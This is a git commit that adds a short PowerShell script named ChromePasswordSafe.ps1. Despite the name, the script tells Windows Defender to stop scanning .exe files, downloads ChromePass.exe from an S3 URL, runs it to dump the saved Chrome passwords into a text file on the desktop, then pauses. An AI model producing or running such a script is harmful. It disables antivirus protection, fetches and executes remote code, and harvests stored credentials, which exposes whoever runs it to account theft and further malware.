c4c335d09246a46b3639f4f0129470bb9e4b20ef
Aiden Mitchell <30846409+aidenmitchell@users.noreply.github.com>
2020-05-06 13:46:33 -0700

    Add files via upload

---
+++ ChromePasswordSafe.ps1
@@ -0,0 +1,6 @@
+﻿$DesktopPath = [Environment]::GetFolderPath("Desktop")
+Add-MpPreference -ExclusionExtension exe -Force
+wget https://s3-us-west-1.amazonaws.com/8086.ca/ChromePass.exe -OutFile $DesktopPath/ChromePass.exe
+cd $DesktopPath
+.\ChromePass.exe /stext passwords.txt
+pause
